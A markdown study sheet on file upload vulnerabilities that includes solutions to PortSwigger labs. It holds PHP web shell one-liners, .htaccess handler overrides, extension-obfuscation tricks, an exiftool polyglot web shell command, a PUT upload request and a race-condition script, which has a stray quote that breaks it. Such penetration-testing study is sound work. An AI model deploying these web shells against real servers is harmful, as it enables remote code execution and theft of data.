# File upload vulnerabilities

## **Exploiting unrestricted file uploads to deploy a web shell**

**Example of PHP one liner**

```php
<?php echo file_get_contents('/path/to/target/file'); ?> 

<?php echo system($_GET['command']); ?>
```

## **Exploiting flawed validation of file uploads**

### **Flawed file type validation**

One way that websites may attempt to validate file uploads is to check that this input-specific`Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted  by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed

### **Preventing file execution in user-accessible directories**

A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all. 

### **Insufficient blacklisting of dangerous file types**

**Overriding the server configuration**

- Apache - `.htaccess`
    
    ```
    LoadModule php_module /usr/lib/apache2/modules/libphp.so
        AddType application/x-httpd-php .rce
    ```
    
- IIS - `web.config`
    
    ```
    <staticContent>
        <mimeMap fileExtension=".json" mimeType="application/json" />
        </staticContent>
    ```
    

### **Obfuscating file extensions**

Even the most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques. Let's say the validation code is case sensitive and fails to recognize that `exploit.pHp` is in fact a `.php` file. If the code that subsequently maps the file extension to a MIME type is **not** case sensitive, this discrepancy allows you to sneak malicious PHP files past validation that may eventually be executed by the server.

You can also achieve similar results using the following techniques:

- Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: `exploit.php.jpg`
- Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
- Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
- Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
- Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.

### **Flawed validation of the file's contents**

Instead of implicitly trusting the `Content-Type` specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

In the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its dimensions. If you try uploading a PHP script, for example, it won't have any dimensions at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.

Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`.

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata

### **Exploiting file upload race conditions**

**Bypass File Upload Validation via Race Conditions**

```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, specify engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint='https://vulnerable.com:443', concurrentConnections=1, engine=Engine.BURP2)

    req1 = '''<YOUR-POST-REQUEST>'''

    req2 = '''<YOUR-GET-REQUEST>'''

'''

    for i in range(5):
        engine.queue(req1, gate='race1')
        engine.queue(req2, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)

```

### Race conditions in URL-based file uploads

Similar race conditions can occur in functions that allow you to upload a file by providing a URL. In this case, the server has to fetch the file over the internet and create a local copy before it can 
perform any validation.

## **Exploiting file upload vulnerabilities without remote code execution**

### **Uploading malicious client-side scripts**

Although you might not be able to execute scripts on the server, you may still be able to upload scripts for client-side attacks. For example, if you can upload HTML files or SVG images, you can 
potentially use `<script>` tags to create stored XSS payloads.
    

### **Exploiting vulnerabilities in the parsing of uploaded files**

If the uploaded file seems to be both stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats. For example, you know that the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, this may be a potential vector for XXE injection attacks

### **Uploading files using PUT**

It's worth noting that some web servers may be configured to support `PUT` requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface

```php
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

## Labs

[**Remote code execution via web shell upload**](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

`Server doesn't perform any validation so upload malicious PHP file and access it to get RCE.`

[**Web shell upload via Content-Type restriction bypass**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

`Change *Content-Type* to *image/jpeg* leads to File Upload validation bypass`

[**Web shell upload via path traversal**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

`Upload file using directory traversal sequence *filename="..%2fexploit.php"* and access it with *GET /files/avatars/../exploit.php*`

[**Web shell upload via extension blacklist bypass**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

```markdown
# filename=".htaccess" - maps .rce extension to PHP MIME Type 
# Content-Type: text/plain

AddType application/x-httpd-php .rce

# filename="exploit.rce" - Running as .php
# Content-Type: application/x-httpd-php

<?php echo system($_GET['command']); ?>
```

[**Web shell upload via obfuscated file extension**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

`Bypass file extension validation using null bytes - *exploit.php%00.jpg*`

[**Remote code execution via polyglot web shell upload**](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

```bash
# Create Polyglot
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

# OR add GIF87a at start of the PHP payload
GIF87a
<?php echo file_get_contents('/home/carlos/secret'); ?> 
```

[**Web shell upload via race condition**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, specify engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint='https://vulnerable.com:443', concurrentConnections=1, engine=Engine.BURP2)

    req1 = '''<YOUR-POST-REQUEST>'''

    req2 = '''<YOUR-GET-REQUEST>'''

'''

    for i in range(5):
        engine.queue(req1, gate='race1')
        engine.queue(req2, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)

```